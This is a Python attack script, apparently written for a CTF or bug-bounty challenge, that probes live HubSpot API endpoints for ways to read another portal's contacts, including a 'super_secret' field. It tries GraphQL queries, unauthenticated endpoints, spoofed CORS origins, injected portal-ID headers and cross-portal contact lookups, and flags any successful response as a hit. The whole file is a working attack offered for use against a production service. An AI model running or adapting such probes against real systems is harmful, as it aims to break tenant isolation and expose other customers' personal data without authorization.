#!/usr/bin/env python3
"""
Direct CTF Attack Script
Tests specific high-probability vulnerabilities for the $15K bounty
"""

import requests
import json
import sys
from config import get_api_key, TARGET_PORTAL_ID, HUBSPOT_COOKIES

def test_graphql_direct():
    """Test GraphQL for direct contact access"""
    print("[*] Testing GraphQL introspection...")

    api_key = get_api_key()

    # GraphQL endpoint
    url = "https://api.hubspot.com/collector/graphql"

    # Try to query contacts from target portal
    queries = [
        # Direct contact query
        {
            "query": """
            query GetContact {
                crmObject(objectId: "1", objectTypeId: "0-1") {
                    properties {
                        name
                        value
                    }
                }
            }
            """
        },
        # Search query
        {
            "query": """
            query SearchContacts {
                crmObjectSearch(objectTypeId: "0-1", limit: 10) {
                    results {
                        objectId
                        properties {
                            name
                            value
                        }
                    }
                }
            }
            """
        },
        # Portal context query
        {
            "query": """
            query GetPortalContacts($portalId: String!) {
                portal(id: $portalId) {
                    contacts(limit: 10) {
                        firstname
                        super_secret
                        email
                    }
                }
            }
            """,
            "variables": {"portalId": TARGET_PORTAL_ID}
        }
    ]

    for i, query in enumerate(queries, 1):
        print(f"\n[*] GraphQL Test {i}/3...")

        headers = {
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json'
        }

        try:
            resp = requests.post(url, json=query, headers=headers, timeout=10)
            print(f"    Status: {resp.status_code}")
            print(f"    Response: {resp.text[:500]}")

            if resp.status_code == 200:
                data = resp.json()
                if 'data' in data and data['data']:
                    print(f"    [!!!] POTENTIAL HIT: {json.dumps(data, indent=2)}")
        except Exception as e:
            print(f"    Error: {e}")

def test_public_endpoints():
    """Test publicly accessible endpoints that might leak data"""
    print("\n[*] Testing public/unauthenticated endpoints...")

    endpoints = [
        f"https://api.hubspot.com/contacts/v1/lists/all/contacts/all?portalId={TARGET_PORTAL_ID}&count=1",
        f"https://api.hubspot.com/crm/v3/objects/contacts?portalId={TARGET_PORTAL_ID}&limit=1",
        f"https://{TARGET_PORTAL_ID}.hs-sites.com/api/contacts",
        f"https://api.hubapi.com/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL_ID}",
    ]

    for url in endpoints:
        print(f"\n[*] Testing: {url[:80]}...")
        try:
            # Try without auth first
            resp = requests.get(url, timeout=10)
            print(f"    No Auth - Status: {resp.status_code}, Length: {len(resp.text)}")
            if resp.status_code == 200:
                print(f"    [!!!] SUCCESS WITHOUT AUTH: {resp.text[:300]}")
        except Exception as e:
            print(f"    Error: {e}")

def test_cors_bypass():
    """Test CORS misconfigurations"""
    print("\n[*] Testing CORS bypass...")

    api_key = get_api_key()
    url = f"https://api.hubapi.com/crm/v3/objects/contacts/1"

    origins = [
        f"https://{TARGET_PORTAL_ID}.hubspot.com",
        f"https://app.hubspot.com",
        f"https://{TARGET_PORTAL_ID}.hs-sites.com",
        "null",
    ]

    for origin in origins:
        headers = {
            'Authorization': f'Bearer {api_key}',
            'Origin': origin,
            'X-Portal-Id': TARGET_PORTAL_ID
        }

        try:
            resp = requests.get(url, headers=headers, timeout=10)
            print(f"    Origin {origin}: {resp.status_code}")
            if 'Access-Control-Allow-Origin' in resp.headers:
                print(f"    [!] CORS Header: {resp.headers['Access-Control-Allow-Origin']}")
        except:
            pass

def test_header_injection():
    """Test various header injection techniques"""
    print("\n[*] Testing header injection...")

    api_key = get_api_key()
    url = "https://api.hubapi.com/crm/v3/objects/contacts/1"

    header_tests = [
        {'X-HubSpot-Portal-Id': TARGET_PORTAL_ID},
        {'X-Portal-Id': TARGET_PORTAL_ID},
        {'X-Hub-Id': TARGET_PORTAL_ID},
        {'HubSpot-Portal-Id': TARGET_PORTAL_ID},
        {'Portal-Id': TARGET_PORTAL_ID},
        {'X-Forwarded-Portal': TARGET_PORTAL_ID},
        {'X-Original-Portal-Id': TARGET_PORTAL_ID},
        {'X-Account-Id': TARGET_PORTAL_ID},
        {'accountId': TARGET_PORTAL_ID},
    ]

    for custom_headers in header_tests:
        headers = {
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json',
            **custom_headers
        }

        header_name = list(custom_headers.keys())[0]

        try:
            resp = requests.get(url, headers=headers, params={'properties': 'firstname,super_secret,email'}, timeout=10)
            print(f"    {header_name}: {resp.status_code} - {len(resp.text)} bytes")

            if resp.status_code not in [400, 403, 404]:
                print(f"    [!] Unusual response: {resp.text[:200]}")
        except Exception as e:
            pass

def test_subdomain_takeover():
    """Check for subdomain issues"""
    print("\n[*] Testing subdomain endpoints...")

    subdomains = [
        f"https://api.hubspot.com/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL_ID}",
        f"https://api.hubapi.com/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL_ID}",
        f"https://app.hubspot.com/api/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL_ID}",
    ]

    api_key = get_api_key()

    for url in subdomains:
        print(f"\n[*] Testing: {url[:80]}...")
        headers = {'Authorization': f'Bearer {api_key}'}

        try:
            resp = requests.get(url, headers=headers, timeout=10)
            print(f"    Status: {resp.status_code}, Length: {len(resp.text)}")
            if resp.status_code == 200:
                print(f"    [!!!] SUCCESS: {resp.text[:300]}")
        except Exception as e:
            print(f"    Error: {e}")

def main():
    print("="*70)
    print("CTF DIRECT ATTACK - $15,000 BOUNTY HUNTER")
    print(f"Target Portal: {TARGET_PORTAL_ID}")
    print("="*70)

    # Run all attack vectors
    test_graphql_direct()
    test_public_endpoints()
    test_cors_bypass()
    test_header_injection()
    test_subdomain_takeover()

    print("\n" + "="*70)
    print("Attack completed. Review output above for any [!!!] markers.")
    print("="*70)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
        sys.exit(0)
